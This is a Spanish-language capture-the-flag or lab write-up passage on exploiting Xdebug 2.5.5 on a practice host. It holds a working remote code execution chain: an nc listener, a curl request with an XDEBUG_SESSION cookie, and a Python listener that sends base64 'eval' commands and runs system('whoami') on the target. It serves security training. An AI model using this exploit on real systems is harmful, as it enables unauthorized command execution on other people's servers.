## Evaluacion de Vulnerabilidades {-}

### searchsploit {-}

Checkeamos si existe un exploit relacionado con **Xdebug 2.5.5**

```bash
searchsploit xdebug
```

Hay un script en Ruby (Metasploit) que permitiria hacer execucion de commandos. Analizamos el exploit con el commando

```bash
searchsploit -x xdebug
```

Que hace el exploit?

- esta tirando de index.php
- se pone en escucha en el equipo de atacante en el puerto 9000
- usa el comando eval 
- deposita en una ruta del servidor un fichero con su contenido en base64
- ejecuta el fichero con php
- la peticion esta enviada por el methodo GET con `'Cookie' => 'XDEBUG_SESSION=+rand_text_alphanumeric(10)'`

### Pruebas del exploit {-}

1. Nos ponemos en escucha en el puerto 9000

    ```bash
    nc -nlvp 9000
    ```

1. Enviamos un peticion GET con el XDEBUG_SESSION en cookie

    ```bash
    curl -s -X GET "http://10.10.10.83/index.php" -H "Cookie: XDEBUG_SESSION=EEEEE"
    ```

Recibimos datos del lado del servidor.

### Explotacion de la vulnerabilidad {-}

Buscamos un exploit en github y encontramos un script cortito que vamos a modificar y llamar exploit_shell.py

```python
#!/usr/bin/python3

import socket
import pdb

from base64 import b64encode

ip_port = ('0.0.0.0', 9000)
sk = socket.socket()
sk.bind(ip_port)
sk.listen(10)
conn, addr = sk.accept()

while True:
    client_data = conn.recv(1024)
    print(client_data)

    data = input('>> ')
    data = data.encode('utf-8')
    conn.sendall(b'eval -i -- ' + b64encode(data) + b'\x00')
```

1. Lanzamos el exploit

    ```bash
    python3 exploit_shell.py
    ```

1. Lanzamos una peticion GET

    ```bash
    curl -s -X GET "http://10.10.10.83/index.php" -H "Cookie: XDEBUG_SESSION=EEEEE"
    ```

1. En la mini shell abierta del exploit_shell.py lanzamos un **whoami**

    ```php
    system('whoami')    
    ```

1. En la respuesta del **curl** se nos pone *www-data*

El exploit funciona y el comando **ifconfig** nos da una ip que no es la 10.10.10.83. Quiere decir que estamos
en un contenedor.
